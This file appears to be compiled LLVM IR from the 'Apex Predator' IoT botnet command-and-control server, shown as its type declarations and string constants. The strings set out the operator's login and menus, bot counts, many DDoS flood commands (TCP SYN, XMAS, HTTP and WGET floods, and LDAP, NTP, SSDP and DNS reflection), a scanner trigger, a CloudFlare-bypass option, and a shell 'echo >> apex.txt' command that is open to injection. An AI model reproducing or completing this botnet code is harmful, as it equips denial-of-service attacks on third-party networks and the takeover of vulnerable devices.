; ModuleID = 'host/ir_sub/Apex_Predator.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8 }
%struct.telnetdata_t = type { i32, i32 }
%struct.account = type { [20 x i8], [20 x i8], [20 x i8] }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.219 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.8 = private unnamed_addr constant [64 x i8] c"%c]0; ApexPredator v2 | IoT Devices: %d | Apex Predators: %d %c\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"apex.txt\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.11 = private unnamed_addr constant [36 x i8] c"\1B[1;37m[\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.14 = private unnamed_addr constant [36 x i8] c"\0A\1B[1;37m[\1B[0;36m%d.%d.%d.%d\1B[1;37m]\00", align 1
@.str.15 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.16 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@.str.17 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.18 = private unnamed_addr constant [32 x i8] c"\1B[0;31mUsername\1B[1;37m: \1B[1;37m\00", align 1
@.str.20 = private unnamed_addr constant [32 x i8] c"\1B[0;31mPassword\1B[1;37m: \1B[1;37m\00", align 1
@.str.21 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.22 = private unnamed_addr constant [23 x i8] c"Login Attempt Saved.\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [56 x i8] c"Please contact the owner if you run into this issue!!\0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.25 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [49 x i8] c"\1B[1;37m              Welome to the \1B[1;31mApex\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [71 x i8] c"\1B[1;37m  A place where all the \1B[1;31mApex Predators\1B[1;37m hang out\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [56 x i8] c"\1B[1;37m              Version 2 [\1B[1;31mcustom\1B[1;37m]\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [28 x i8] c"\1B[1;31mApexPredator\1B[1;37m#\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"devices\00", align 1
@.str.33 = private unnamed_addr constant [8 x i8] c"DEVICES\00", align 1
@.str.34 = private unnamed_addr constant [141 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m.\1B[1;36mssh\1B[1;37m] - \1B[1;31m %d \0D\0A\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m.\1B[1;36musers\1B[1;37m] - \1B[1;31m %d \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"Help\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]All Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [84 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]---------------------------------------------------------\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;31mClear Screen\1B[1;37m]         CLEAR\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;32mLOGOUT\1B[1;37m]               LOGOUT\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;33mUsable Ports\1B[1;37m]         PORTS\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;34mRules\1B[1;37m]                RULES\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;36mSpoofing Methods\1B[1;37m]     SPOOF\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [54 x i8] c"\1B[1;37m[\1B[1;31mSpecial Commands\1B[1;37m]     SPECIAL\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;32mScanning Commands\1B[1;37m]    REAPER\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;33mStressing Commands\1B[1;37m]   STRESS\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [7 x i8] c"STRESS\00", align 1
@.str.49 = private unnamed_addr constant [7 x i8] c"stress\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"ddos\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"DDOS\00", align 1
@.str.52 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Method Listings\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[1;31mLayer4 UDP\1B[1;37m]               L4UDP  \0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[1;31mLayer4 TCP\1B[1;37m]               L4TCP  \0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [60 x i8] c"\1B[1;37m[\1B[1;31mLayer4 Spoofing\1B[1;37m]          L4SPOOF  \0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [55 x i8] c"\1B[1;37m[\1B[1;31mLayer7\1B[1;37m]                   L7  \0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [6 x i8] c"L4UDP\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"l4udp\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"l4UDP\00", align 1
@.str.60 = private unnamed_addr constant [6 x i8] c"L4udp\00", align 1
@.str.61 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 4 UDP Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [114 x i8] c"\1B[1;37m[\1B[1;31mUDP Flood\1B[1;37m]    !* UDP  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 0 1\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mSTD Flood\1B[1;37m]    !* STD  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.64 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mHOLD Flood\1B[1;37m]   !* HOLD [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mJUNK Flood\1B[1;37m]   !* JUNK [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mCNC Flood\1B[1;37m]    !* CNC  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mADMIN PORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"L4TCP\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"l4tcp\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"l4TCP\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"L4tcp\00", align 1
@.str.71 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 4 TCP Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-ALL Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 ALL 0 1\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-SYN Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 SYN 0 1\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-FIN Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 FIN 0 1\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-RST Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 RST 0 1\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-PSH Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 PSH 0 1\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-CRI Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 CRI 0 1\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-PRO Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 PRO 0 1\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-ACK Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 ACK 0 1\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [120 x i8] c"\1B[1;37m[\1B[1;31mTCP-XMAS Flood\1B[1;37m] !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 XMAS 0 1\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [3 x i8] c"L7\00", align 1
@.str.82 = private unnamed_addr constant [3 x i8] c"l7\00", align 1
@.str.83 = private unnamed_addr constant [7 x i8] c"layer7\00", align 1
@.str.84 = private unnamed_addr constant [7 x i8] c"Layer7\00", align 1
@.str.85 = private unnamed_addr constant [7 x i8] c"LAYER7\00", align 1
@.str.86 = private unnamed_addr constant [79 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 7 Method Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[1;31mHTTP Flood\1B[1;37m]   !* HTTP  [\1B[1;31mURL\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[1;31mWGET Flood\1B[1;37m]   !* WGET  [\1B[1;31mURL\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"L4SPOOF\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"l4spoof\00", align 1
@.str.91 = private unnamed_addr constant [8 x i8] c"l4SPOOF\00", align 1
@.str.92 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Spoofing Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mLDAP Flood\1B[1;37m]     !* LDAP     [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;32mNTP Flood\1B[1;37m]      !* NTP      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.95 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;33mSSDP Flood\1B[1;37m]     !* SSDP     [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;34mDNS Flood\1B[1;37m]      !* DNS      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;35mREAPER Flood\1B[1;37m]   !* REAPER   [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.98 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;36mMSSQL Flood\1B[1;37m]    !* MSSQL    [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mPORTMAP Flood\1B[1;37m]  !* PORTMAP  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.100 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;32mTS3 Flood\1B[1;37m]      !* TS3      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.101 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL Flood\1B[1;37m] !* SENTINEL [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.102 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Reflection Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;31mLDAP\1B[1;37m]:\1B[1;31m 0 \0D\0A\00", align 1
@.str.104 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mNTP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [40 x i8] c"\1B[1;37m[\1B[1;33mSSDP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.106 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;34mDNS\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.107 = private unnamed_addr constant [42 x i8] c"\1B[1;37m[\1B[1;35mREAPER\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.108 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;36mMSSQL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.109 = private unnamed_addr constant [43 x i8] c"\1B[1;37m[\1B[1;31mPORTMAP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.110 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mTS3\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [44 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.112 = private unnamed_addr constant [8 x i8] c"SPECIAL\00", align 1
@.str.113 = private unnamed_addr constant [6 x i8] c"ADMIN\00", align 1
@.str.114 = private unnamed_addr constant [6 x i8] c"Admin\00", align 1
@.str.115 = private unnamed_addr constant [8 x i8] c"special\00", align 1
@.str.116 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Special Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.117 = private unnamed_addr constant [95 x i8] c"\1B[1;37m[\1B[1;31mAdds User\1B[1;37m]         root_add  [\1B[1;31mUSER\1B[1;37m] [\1B[1;31mPASS\1B[1;37m]\0D\0A\00", align 1
@.str.118 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;32mIP Geolocation\1B[1;37m]    root_geo  [\1B[1;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.119 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;33mSubDomain Scanner\1B[1;37m] root_sub  [\1B[1;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;34mPort Scanner\1B[1;37m]      root_scan [\1B[1;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;35mCloudFlare Bypass\1B[1;37m] root_cf   [\1B[1;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.122 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.123 = private unnamed_addr constant [77 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Logged Out!\0A\00", align 1
@.str.124 = private unnamed_addr constant [11 x i8] c"LOGOUT.log\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"logout\00", align 1
@.str.126 = private unnamed_addr constant [5 x i8] c"MOVE\00", align 1
@.str.127 = private unnamed_addr constant [5 x i8] c"move\00", align 1
@.str.128 = private unnamed_addr constant [95 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.129 = private unnamed_addr constant [10 x i8] c"SHELL.log\00", align 1
@.str.130 = private unnamed_addr constant [94 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User: \1B[0;36m%s\1B[1;37m Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.131 = private unnamed_addr constant [8 x i8] c"!* STOP\00", align 1
@.str.132 = private unnamed_addr constant [12 x i8] c"!* KILLATTK\00", align 1
@.str.133 = private unnamed_addr constant [25 x i8] c"[Reaper] Attack Stopped!\00", align 1
@.str.134 = private unnamed_addr constant [7 x i8] c"!* UDP\00", align 1
@.str.135 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mUDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.136 = private unnamed_addr constant [7 x i8] c"!* STD\00", align 1
@.str.137 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSTD \1B[1;37mFlood!\0D\0A\00", align 1
@.str.138 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.139 = private unnamed_addr constant [8 x i8] c"RESOLVE\00", align 1
@.str.140 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.141 = private unnamed_addr constant [66 x i8] c"Resolved \1B[1;37m[\1B[0;31m%s\1B[1;37m] to \1B[1;37m[\1B[0;31m%s\1B[1;37m]\0D\0A\00", align 1
@.str.142 = private unnamed_addr constant [60 x i8] c"\1B[1;37mYou Dont Have Permission To Use This\1B[0;31m!\1B[1;37\0D\0A\00", align 1
@.str.143 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"ADDUSER\00", align 1
@.str.145 = private unnamed_addr constant [22 x i8] c"echo '%s' >> apex.txt\00", align 1
@.str.146 = private unnamed_addr constant [90 x i8] c"\1B[1;37m[\1B[1;31mApex\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.147 = private unnamed_addr constant [91 x i8] c"\1B[1;37m[\1B[1;31mApex\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0D\0A\00", align 1
@.str.148 = private unnamed_addr constant [7 x i8] c"!* CNC\00", align 1
@.str.149 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mCNC \1B[1;37mFlood!\0D\0A\00", align 1
@.str.150 = private unnamed_addr constant [8 x i8] c"!* HTTP\00", align 1
@.str.151 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mHTTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.152 = private unnamed_addr constant [8 x i8] c"!* JUNK\00", align 1
@.str.153 = private unnamed_addr constant [8 x i8] c"!* HOLD\00", align 1
@.str.154 = private unnamed_addr constant [7 x i8] c"!* TCP\00", align 1
@.str.155 = private unnamed_addr constant [57 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Loading sockets...\0D\0A\00", align 1
@.str.156 = private unnamed_addr constant [8 x i8] c"!* WGET\00", align 1
@.str.157 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mWGET \1B[1;37mFlood!\0D\0A\00", align 1
@.str.158 = private unnamed_addr constant [5 x i8] c"XMAS\00", align 1
@.str.159 = private unnamed_addr constant [124 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mT\1B[1;32mC\1B[1;33mP\1B[1;34m-\1B[1;35mX\1B[1;36mM\1B[1;31mA\1B[1;32mS \1B[1;37mFlood\0D\0A\00", align 1
@.str.160 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.161 = private unnamed_addr constant [103 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mTCP \1B[1;37mFlood using \1B[1;31mALL \1B[1;37mMethods!\0D\0A\00", align 1
@.str.162 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.163 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-SYN \1B[1;37mFlood\0D\0A\00", align 1
@.str.164 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.165 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-FIN \1B[1;37mFlood\0D\0A\00", align 1
@.str.166 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.167 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-RST \1B[1;37mFlood\0D\0A\00", align 1
@.str.168 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.169 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-ACK \1B[1;37mFlood\0D\0A\00", align 1
@.str.170 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.171 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-PSH \1B[1;37mFlood\0D\0A\00", align 1
@.str.172 = private unnamed_addr constant [4 x i8] c"PRO\00", align 1
@.str.173 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-PRO \1B[1;37mFlood\0D\0A\00", align 1
@.str.174 = private unnamed_addr constant [4 x i8] c"CRI\00", align 1
@.str.175 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-CRI \1B[1;37mFlood\0D\0A\00", align 1
@.str.176 = private unnamed_addr constant [5 x i8] c"ldap\00", align 1
@.str.177 = private unnamed_addr constant [5 x i8] c"LDAP\00", align 1
@.str.178 = private unnamed_addr constant [30 x i8] c"./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.179 = private unnamed_addr constant [70 x i8] c"[ApexPredator] Sending LDAP Attack to %s On Port %s For %s Seconds! \0A\00", align 1
@.str.180 = private unnamed_addr constant [10 x i8] c"root_ssdp\00", align 1
@.str.181 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSSDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.182 = private unnamed_addr constant [9 x i8] c"root_ntp\00", align 1
@.str.183 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mNTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.184 = private unnamed_addr constant [14 x i8] c"root_sentinel\00", align 1
@.str.185 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSENTINEL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.186 = private unnamed_addr constant [9 x i8] c"root_dns\00", align 1
@.str.187 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mDNS \1B[1;37mFlood!\0D\0A\00", align 1
@.str.188 = private unnamed_addr constant [12 x i8] c"root_reaper\00", align 1
@.str.189 = private unnamed_addr constant [80 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mApexPredator \1B[1;37mFlood!\0D\0A\00", align 1
@.str.190 = private unnamed_addr constant [11 x i8] c"root_mssql\00", align 1
@.str.191 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mMSSQL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.192 = private unnamed_addr constant [13 x i8] c"root_portmap\00", align 1
@.str.193 = private unnamed_addr constant [75 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mPORTMAP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.194 = private unnamed_addr constant [9 x i8] c"root_ts3\00", align 1
@.str.195 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mTS3 \1B[1;37mFlood!\0D\0A\00", align 1
@.str.196 = private unnamed_addr constant [14 x i8] c"!* SCANNER ON\00", align 1
